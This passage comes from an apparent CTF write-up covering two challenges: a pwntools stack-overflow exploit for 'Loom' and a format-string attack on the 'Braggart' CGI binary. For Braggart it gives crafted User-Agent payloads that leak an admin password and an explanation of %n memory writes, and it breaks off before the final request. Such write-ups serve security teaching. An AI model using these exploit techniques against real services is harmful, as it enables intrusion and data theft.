class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+94h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+9Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n=============================================================================\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You enter the room of fates and see the tapestry of reality laid out before you.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nThe voice in your head returns:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&#x27;Are you willing to force your prophecy onto the past? To corrupt this reality to find what you seek?&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n1) Yes\n2) No\n\n&gt; &quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  fgets(s, <span class="number">8</span>, _bss_start);</span><br><span class="line">  v4 = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strcpy</span>(dest, prophecyPtr);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;\nYou leave the room of the fates, this reality intact.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Taking a look at function, notice that <code>char dest[132]</code> has the length of 132 and will be overwritten using <code>strcpy(dest, prophecyPtr)</code>, and as we already know we can control the content inside <code>prophecyPtr</code> up to 268 in length from entering the <code>loomRoom</code> function, which is large enough for us to overwrite the return address inside the stack</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./loom&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process()</span></span><br><span class="line">io = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>, <span class="number">33616</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload = flat(&#123;<span class="number">0x98</span>: elf.symbols[<span class="string">&#x27;theVoid&#x27;</span>]&#125;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Choose your next move&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;You enter the room of the loom&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.wait(timeout=<span class="number">0.1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Choose your next move&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Speak the unpronouncable phrase&#x27;</span>, <span class="string">b&#x27;QjVHST7M11cY7Ws6mXU1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;1) Yes&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.clean()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>Flag: <code>flag&#123;d0nt_f0rg3t_y0ur_h4t&#125;</code></p>
<h3 id="Braggart"><a href="#Braggart" class="headerlink" title="Braggart"></a>Braggart</h3><p>Score: 469<br>Solve: 32&#x2F;1489</p>
<p>Description:</p>
<blockquote>
<p>This guy keeps bragging about keeping us out of his secrets.<br>It’s annoying.<br>Get the flag please.<br><a target="_blank" rel="noopener" href="https://nessus-braggart.chals.io/">https://nessus-braggart.chals.io</a></p>
</blockquote>
<p>File: <a href="sec.bak">sec.bak</a></p>
<h4 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h4><p><img src="tenable2023-braggart-page.png"></p>
<p>As we land on the page, we can see the <code>backup</code> file link, if we download it and check using <code>file</code> command we will see that it’s an ELF executable</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 contentLength; <span class="comment">// [rsp+8h] [rbp-88h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *QUERY_STRING; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *REQUEST_METHOD; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> *HTTP_X_DEBUG; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="type">char</span> *AdminPass; <span class="comment">// [rsp+28h] [rbp-68h]</span></span><br><span class="line">  <span class="type">char</span> *HTTP_X_PASSWORD; <span class="comment">// [rsp+30h] [rbp-60h]</span></span><br><span class="line">  <span class="type">char</span> *CONTENT_LENGTH; <span class="comment">// [rsp+38h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> data[<span class="number">72</span>]; <span class="comment">// [rsp+40h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 __canary; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  QUERY_STRING = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">  REQUEST_METHOD = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  HTTP_X_DEBUG = getenv(<span class="string">&quot;HTTP_X_DEBUG&quot;</span>);</span><br><span class="line">  AdminPass = getenv(<span class="string">&quot;AdminPass&quot;</span>);</span><br><span class="line">  HTTP_X_PASSWORD = getenv(<span class="string">&quot;HTTP_X_PASSWORD&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, <span class="string">&quot;Content-Type:text/html&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( HTTP_X_DEBUG &amp;&amp; atoi(HTTP_X_DEBUG) == <span class="number">1</span> )</span><br><span class="line">    setDebug();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;TITLE&gt;Secrets&lt;/TITLE&gt;&quot;</span>);</span><br><span class="line">  CONTENT_LENGTH = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( CONTENT_LENGTH &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(CONTENT_LENGTH, <span class="string">&quot;%ld&quot;</span>, &amp;contentLength) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( contentLength &lt;= <span class="number">63</span> )</span><br><span class="line">      fgets(data, contentLength, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;h4&gt;Err:Too much data&lt;/h4&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( HTTP_X_PASSWORD &amp;&amp; !<span class="built_in">strcmp</span>(AdminPass, HTTP_X_PASSWORD) )</span><br><span class="line">    printSecrets();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    printMain();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Looking at <code>main</code> function we can make an educated guess that those values from <code>getenv</code> are from the value we passed through HTTP headers</p>
<p>Let’s test it by query it through Burp Suite</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /sec.cgi HTTP/1.1</span><br><span class="line">Host: nessus-braggart.chals.io</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line">X-Debug: 1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 12 Aug 2023 05:43:25 GMT</span><br><span class="line">Server: Apache/2.4.52 (Ubuntu)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 321</span><br><span class="line"></span><br><span class="line">&lt;TITLE&gt;Secrets&lt;/TITLE&gt;</span><br><span class="line">&lt;pre&gt;&lt;h1&gt;debug info&lt;/h1&gt;&lt;h3&gt; Remote Addr : &lt;/h3&gt;10.1.165.197&lt;h3&gt; User Agent : &lt;/h3&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&lt;/pre&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;&lt;H3&gt;Ah Ah Ah, you didn&#x27;t say the magic word.&lt;/H3&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;a href=&#x27;sec.bak&#x27;&gt;backup&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>And yes we were right, for now it’s look like that our objective is to find a way to leak the <code>adminPass</code> and call the <code>printSecrets</code> function</p>
<h4 id="Leak-Password"><a href="#Leak-Password" class="headerlink" title="Leak Password"></a>Leak Password</h4><p>Let’s take a further look on <code>printDebugInfo</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">printDebugInfo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *REMOTE_ADDR; <span class="comment">// [rsp+8h] [rbp-808h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *HTTP_USER_AGENT; <span class="comment">// [rsp+8h] [rbp-808h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">1008</span>]; <span class="comment">// [rsp+10h] [rbp-800h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">8</span>]; <span class="comment">// [rsp+400h] [rbp-410h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+408h] [rbp-408h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">1008</span>]; <span class="comment">// [rsp+410h] [rbp-400h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+808h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)format = <span class="number">29477LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&lt;pre&gt;&lt;h1&gt;debug info&lt;/h1&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&lt;h3&gt; Remote Addr : &lt;/h3&gt;&quot;</span>);</span><br><span class="line">  REMOTE_ADDR = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, REMOTE_ADDR);</span><br><span class="line">  <span class="built_in">printf</span>(format, REMOTE_ADDR);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&lt;h3&gt; User Agent : &lt;/h3&gt;&quot;</span>);</span><br><span class="line">  HTTP_USER_AGENT = getenv(<span class="string">&quot;HTTP_USER_AGENT&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, HTTP_USER_AGENT);</span><br><span class="line">  <span class="built_in">printf</span>(format, HTTP_USER_AGENT);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&lt;/pre&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Due to the use of <code>strcpy(dest, HTTP_USER_AGENT)</code>, it open opportunity for us to carry out an buffer overflow exploit and overwrite the <code>format</code> string</p>
<p>Plus, this function is vulnerable to format string exploit as in the line 19 and 23, but we can only control <code>HTTP_USER_AGENT</code> so <code>printf</code> at line 23 will  be our prime target</p>
<p>Due to format string exploit, we can arbitrary read any data live on higher address than RSP value of the stack using <code>llx</code> or pointed by any pointer on the stack using <code>%s</code> and amazingly we can also write any data pointed by any pointer on the stack using <code>%n</code> (noted this is only by default on most Linux not Windows)</p>
<p>In order to check where the <code>AdminsPass</code> is relative to the point of execution at <code>printf</code> that vulnerable to format string vulnerability, let’s use GDB and also set the environment variable for testing using the following command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AdminPass=<span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="built_in">export</span> workingDir=<span class="string">&quot;./&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTP_X_DEBUG=<span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="built_in">export</span> REMOTE_ADDR=<span class="string">&quot;10.1.165.197&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTP_USER_AGENT=<span class="string">&quot;Chrome&quot;</span></span><br><span class="line"></span><br><span class="line">gdb sec.bak</span><br></pre></td></tr></table></figure>

<p>Now, we can use <code>disas printDebugInfo</code> to see where the vulnerable <code>printf</code> function is, which is <code>printDebugInfo+284</code>, then use it to set the breakpoint <code>b *printDebugInfo+284</code> then config GDB to print more range of data inside the stack using <code>gef config context.nb_lines_stack 300</code> and use <code>context stack</code> to see where the <code>AdminPass</code> is:</p>
<p><img src="tenable2023-braggart-get-pass-on-the-stack.png"></p>
<p>Alright, now we know that the <code>AdminPass</code> is at <code>RSP+0x868</code>, next is we have to calculate the offset of <code>format</code> and <code>data</code> array so we know how much we need to write to overwrite the <code>format</code></p>
<p>From IDA we know that <code>data</code> is at <code>rbp-800h</code> and <code>format</code> is at <code>rbp-410h</code> that mean the offset is <code>(rbp-410h) - (rbp-800h) = 3f0h = 1008</code></p>
<p>So, the format exploit will then be <code>%&#123;0x868/8+6&#125;$s</code> which is <code>%275$s</code> we divide 0x868 by 8 because positional argument in format string jump by multiple of 8 in amd64 and plus 6 to skip the registers: RSI, RDX, RCX, R8, and R9, let’s send it to the server!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /sec.cgi HTTP/1.1</span><br><span class="line">Host: nessus-braggart.chals.io</span><br><span class="line">User-Agent: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaak%275$s</span><br><span class="line">X-Debug: 1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The response:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 12 Aug 2023 07:02:39 GMT</span><br><span class="line">Server: Apache/2.4.52 (Ubuntu)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 218</span><br><span class="line"></span><br><span class="line">&lt;TITLE&gt;Secrets&lt;/TITLE&gt;</span><br><span class="line">&lt;pre&gt;&lt;h1&gt;debug info&lt;/h1&gt;&lt;h3&gt; Remote Addr : &lt;/h3&gt;10.1.1.5&lt;h3&gt; User Agent : &lt;/h3&gt;xbYP3h7Ua94c&lt;/pre&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;&lt;H3&gt;Ah Ah Ah, you didn&#x27;t say the magic word.&lt;/H3&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;a href=&#x27;sec.bak&#x27;&gt;backup&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>Cool! the <code>AdminPass</code> is <code>xbYP3h7Ua94c</code>. Let’s include it in our request</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /sec.cgi HTTP/1.1</span><br><span class="line">Host: nessus-braggart.chals.io</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line">X-Debug: 1</span><br><span class="line">X-Password: xbYP3h7Ua94c</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The response:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 12 Aug 2023 07:07:03 GMT</span><br><span class="line">Server: Apache/2.4.52 (Ubuntu)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 381</span><br><span class="line"></span><br><span class="line">&lt;TITLE&gt;Secrets&lt;/TITLE&gt;</span><br><span class="line">&lt;pre&gt;&lt;h1&gt;debug info&lt;/h1&gt;&lt;h3&gt; Remote Addr : &lt;/h3&gt;10.1.165.197&lt;h3&gt; User Agent : &lt;/h3&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&lt;/pre&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;&lt;pre&gt;&lt;h3&gt; secrets : &lt;/h3&gt; The secret is that the flag is in /home/ctf/flag, not here. You&#x27;ll never get my secrets because I&#x27;m wicked smart.</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>The secret:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The secret is that the flag is in /home/ctf/flag, not here. You&#x27;ll never get my secrets because I&#x27;m wicked smart.</span><br></pre></td></tr></table></figure>

<p>Well look like we’re not done yet 😫. this guy want us to read the flag inside <code>/home/ctf/flag</code> 😤</p>
<p>Back to the analysis, I guess</p>
<h4 id="Overwrite-brag-to-flag"><a href="#Overwrite-brag-to-flag" class="headerlink" title="Overwrite brag to flag"></a>Overwrite <code>brag</code> to <code>flag</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">printSecrets</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> c; <span class="comment">// [rsp+7h] [rbp-29h]</span></span><br><span class="line">  <span class="type">char</span> *brag; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *workingDir; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *workingDirBrag; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 __canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  brag = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;brag[<span class="built_in">strlen</span>(brag)], <span class="string">&quot;brag&quot;</span>);</span><br><span class="line">  workingDir = getenv(<span class="string">&quot;workingDir&quot;</span>);</span><br><span class="line">  workingDirBrag = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( debug )</span><br><span class="line">    printDebugInfo();</span><br><span class="line">  <span class="built_in">strcat</span>(workingDirBrag, workingDir);</span><br><span class="line">  <span class="built_in">strcat</span>(workingDirBrag, brag);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&lt;pre&gt;&lt;h3&gt; secrets : &lt;/h3&gt;&quot;</span>);</span><br><span class="line">  stream = fopen(workingDirBrag, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( c != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(c);</span><br><span class="line">      c = fgetc(stream);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __canary - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Upon further analysis, we know that there’s a string pointer to <code>brag</code> string on the stack, which could be use to overwrite the <code>brag</code> string to <code>flag</code> string, we can find the address of the pointer relative to the RSP at the point of execution of vulnerable <code>printf</code> using the same method the we use previously to find the location of <code>AdminPass</code> and don’t forget to also run <code>export HTTP_X_PASSWORD=xbYP3h7Ua94c</code>, so we have the same stack structure as on the server</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AdminPass=<span class="string">&quot;xbYP3h7Ua94c&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTP_X_PASSWORD=<span class="string">&quot;xbYP3h7Ua94c&quot;</span></span><br><span class="line"></span><br><span class="line">gdb sec.bak</span><br></pre></td></tr></table></figure>

<p>After GDB has loaded, use the same commands</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b *printDebugInfo+284</span><br><span class="line">r</span><br><span class="line">gef config context.nb_lines_stack 300</span><br><span class="line">context stack</span><br></pre></td></tr></table></figure>

<p><img src="tenable2023-breggart-breg-address.png"></p>
<p>We can see that <code>brag</code> pointer is at RSP+0x828, which mean the positional argument we are going to use is <code>0x828 / 8 + 6 = 0x10b = 267</code></p>
<p>But how we are going to write? Well, <code>%n</code> will write number of printed characters printed by <code>printf</code>, for example, <code>printf(&quot;123%n&quot;, &amp;x)</code> will write integer (4 bytes) 3 inside the <code>x</code> variable, in addition to this if we want to only write 2 bytes we could use <code>%hn</code></p>
<p>The <code>flag</code> string that stored inside the memory is equivalent to <code>67616c66</code> due to little endianness, but we know that <code>brag</code> and <code>flag</code> have <code>ag</code> in common, so we only have to overwrite <code>br</code> to <code>fl</code> which is <code>6c66</code> in hex or <code>27750</code> in decimal</p>
<p>Now, we could write 27750 characters, and then use <code>%n</code> but the simpler solution is to simply use <code>%27750c</code>, which will left padding a character until it have the width of 27750</p>
<p>Here’s the request:</p>
